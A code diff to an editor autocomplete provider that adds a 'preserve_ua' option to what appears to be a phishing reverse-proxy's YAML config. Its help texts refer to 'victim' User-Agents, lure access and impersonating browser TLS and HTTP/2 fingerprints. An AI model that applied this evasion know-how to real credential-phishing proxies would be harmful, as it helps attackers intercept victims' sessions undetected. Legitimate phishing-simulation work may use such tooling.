@@ -113,6 +113,9 @@ export class ProxyYamlCompletionProvider {
 		if (linePrefix.match(/\s*http_version:\s*$/)) {
 			return this.getHTTPVersionSuggestions(range);
 		}
+		if (linePrefix.match(/\s*preserve_ua:\s*$/)) {
+			return this.getPreserveUASuggestions(range);
+		}
 		if (linePrefix.match(/\s*enabled:\s*$/)) {
 			// could be impersonation.enabled - return boolean suggestions
 			return this.getEnabledSuggestions(range);
@@ -330,6 +333,14 @@ export class ProxyYamlCompletionProvider {
 				insertText: 'http_version: ',
 				documentation: 'HTTP version to use (http1, http2, http3)',
 				range
+			},
+			{
+				label: 'preserve_ua',
+				kind: this.monaco.languages.CompletionItemKind.Property,
+				insertText: 'preserve_ua: ',
+				documentation:
+					'Preserve victim User-Agent (true, false). Default: false. When true, keeps TLS/HTTP/2 fingerprinting but uses victim UA (creates mismatch).',
+				range
 			}
 		];
 	}
@@ -421,6 +432,27 @@ export class ProxyYamlCompletionProvider {
 				kind: this.monaco.languages.CompletionItemKind.Value,
 				insertText: '"http3"',
 				documentation: 'Use HTTP/3 over QUIC',
+				range
+			}
+		];
+	}
+
+	getPreserveUASuggestions(range) {
+		return [
+			{
+				label: 'false',
+				kind: this.monaco.languages.CompletionItemKind.Value,
+				insertText: 'false',
+				documentation:
+					"Use surf's impersonated User-Agent (default, UA matches TLS fingerprint perfectly)",
+				range
+			},
+			{
+				label: 'true',
+				kind: this.monaco.languages.CompletionItemKind.Value,
+				insertText: 'true',
+				documentation:
+					"Preserve victim's User-Agent (keeps TLS/HTTP/2 fingerprinting, but UA won't match fingerprint)",
 				range
 			}
 		];
@@ -1153,6 +1185,8 @@ export class ProxyYamlCompletionProvider {
 			browser: 'Browser to impersonate: "chrome" (Chrome v142) or "firefox" (Firefox v144)',
 			os: 'Operating system to impersonate: "windows", "macos", "linux", "android", "ios", or "random"',
 			http_version: 'HTTP version to use: "http1", "http2" (default), or "http3"',
+			preserve_ua:
+				'Preserve victim User-Agent: false (default, uses surf UA for perfect fingerprint match) or true (overwrites surf UA with victim UA after impersonation - creates UA/fingerprint mismatch)',
 			tls: 'TLS certificate configuration for proxy domains',
 			access: 'Access control configuration (optional - defaults to private mode for security)',
 			mode: 'Access control mode: "public" (allow all traffic) or "private" (IP whitelist after lure access, DEFAULT), OR TLS mode: "managed" (Let\'s Encrypt) or "self-signed"',
